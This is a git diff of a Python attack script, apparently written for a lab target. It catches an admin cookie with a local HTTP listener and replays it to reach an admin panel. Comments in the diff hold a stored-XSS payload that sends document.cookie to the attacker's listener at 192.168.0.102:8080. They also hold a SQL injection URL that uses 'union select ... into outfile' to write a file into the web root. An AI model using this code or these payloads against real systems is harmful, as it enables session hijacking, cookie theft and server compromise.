@@ -12,6 +12,7 @@ Usage::
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import logging
 import requests
+import sys
 
 
 # Class S to server as the http server handler to receive the requests with the admin cookie.
@@ -64,8 +65,12 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
     }
     # Send an HTTP request to the admin panel with our admin cookie to make sure it works.
     response = requests.get('http://192.168.0.228/admin',cookies=cookies,verify=False)
+    if "Logout" in str(response.content):
+        print("We are admin!")
+    else:
+        sys.exit("Didn't work...Exiting")
 
-
+    #
 
 # Main function that runs when executing the script.
 if __name__ == '__main__':
@@ -78,9 +83,9 @@ if __name__ == '__main__':
 
 
 # # TODO:
-# 1. Search the response content for keywords like "Logout" to confirm we are logged in as admin.  If we don't see these keywords, then kill the script and notify the user to try again.
-##    print("Request headers %s", response.request.headers)
-##    print(response.content)
+# 0. Send the XXS code to the comment.
+# <script>(new Image()).src = "http://192.168.0.102:8080/?cookie=" + document.cookie;</script>
+
 # 2. Send the GET request with exploit code to write to the server.  Ideal to use some exploit code from MSF?
 ## Exploit GET request to write content to the server in the css folder where we have access.  We just have to do a GET at the dropped location to activate exploit.
 ## http://192.168.0.228/admin/edit.php?id=0%20union%20select%201,%22file%20written%20successfully!%22,3,4%20into%20outfile%20%27/var/www/css/proof.txt%27
